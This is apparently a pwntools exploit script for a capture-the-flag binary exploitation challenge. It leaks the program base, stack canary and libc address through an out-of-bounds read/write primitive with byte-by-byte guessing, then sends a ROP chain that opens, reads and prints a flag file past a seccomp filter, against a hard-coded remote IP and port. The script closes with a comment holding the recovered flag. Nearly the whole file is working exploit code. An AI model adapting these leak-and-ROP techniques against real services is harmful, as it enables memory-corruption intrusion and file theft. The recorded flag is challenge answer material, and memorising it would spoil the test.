#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.167.132.153 --port 55901 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.167.132.153'
port = int(args.PORT or 55901)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *sphinx_labyrinth+604
# b *sphinx_labyrinth+681
b *sphinx_secret_hideout+79
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  '.'

io = start()

libc = ELF("./libc.so.6")

def write_what(idx,what):
    io.sendlineafter("[>]  ",str(idx))
    io.sendlineafter("[>]  ",str(2))
    io.sendlineafter("[>]  ",str(what))

def guess_what(idx):
    for i in range(0,256):
        io.sendlineafter("[>]  ",str(idx))
        io.sendlineafter("[>]  ",str(1))
        io.sendlineafter("[>]  ",str(i))
        if "not the correct" not in io.recvline() :
            return i

def guess_until(idx,longe):
    leak = ""
    for i in range(longe-1,-1,-1):

        leak += str(hex(guess_what(idx+i)))[2:].rjust(2,"0")
    return int(leak,16)

# seccomp_rule_add(uVar2,0x7fff0000,2,0);
# seccomp_rule_add(uVar2,0x7fff0000,0,0);
# seccomp_rule_add(uVar2,0x7fff0000,1,0);
# seccomp_rule_add(uVar2,0x7fff0000,0x4e,0); getdents, unsigned int fd struct linux_dirent *dirent, unsigned int count
# seccomp_rule_add(uVar2,0x7fff0000,0x3c,0);
# seccomp_rule_add(uVar2,0x7fff0000,0xe7,0);

write_what(-8,20)

# print(guess_what(0x28))
exe.address = guess_until(0x28,8)-0x10ed
print(hex(exe.address ))

write_what(-12,0)

cannary = guess_until(0x18,8)
print(hex(cannary))

write_what(-12,0)

libc.address = guess_until(0x28+16,8) - 243 - libc.sym['__libc_start_main']
print(hex(libc.address))

write_what(0x28,0x85)

new_stack = exe.bss() + 0x400
print(hex(new_stack))

store_loc = exe.bss() + 0x500

flag = "./flag_haQAEmYFLNgGirsH.txt\x00"

rop = ROP([exe, libc], base=new_stack)
rop.raw("a"*40 + p64(cannary) + p64(0))
rop.read(0, new_stack, len(flag))
rop.call(libc.symbols['syscall'],(constants.SYS_open, new_stack, 0, 0))
# rop.call(libc.symbols['syscall'],(0x4e, 4, store_loc, 0x500))
rop.read(4, store_loc, 0x500)
rop.write(1, store_loc, 0x500)

# ctf

p = rop.chain()

io.sendline(p)
sleep(0.5)
io.sendline(flag)

# io.recvuntil("find my hideout!!\n")
# leak = dirents(io.recv())
# print(leak)
# [u'', u'', u'.', u'..', u'.bash_logout', u'.bashrc', u'.profile', u'chall', u'flag_haQAEmYFLNgGirsH.txt', u'ld-linux.so.2', u'libc.so.6']

# TechnoFairCTF{Sph1nx_00B_7heN_ORW!!1!}

io.interactive()

